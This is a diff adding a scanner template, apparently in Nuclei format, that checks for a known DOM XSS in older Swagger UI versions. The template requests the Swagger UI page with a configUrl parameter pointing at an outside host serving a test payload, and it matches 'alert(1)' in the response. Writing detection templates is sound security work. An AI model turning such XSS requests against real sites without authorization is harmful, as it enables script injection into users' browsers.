@@ -1,0 +1,16 @@
+id: K70n0s510-xss-swagger
+info:
+  name: Swagger UI DOM XSS
+  author: K70n0s510
+  severity: medium
+  description: Exploits known DOM XSS in older Swagger UI versions via configUrl.
+  tags: xss,swagger
+http:
+  - method: GET
+    path: ["{{BaseURL}}/swagger-ui/index.html?configUrl=https://jumpy-floor.surge.sh/test.json"]
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["alert(1)"]
+      - type: word
+        words: ["Swagger UI"]
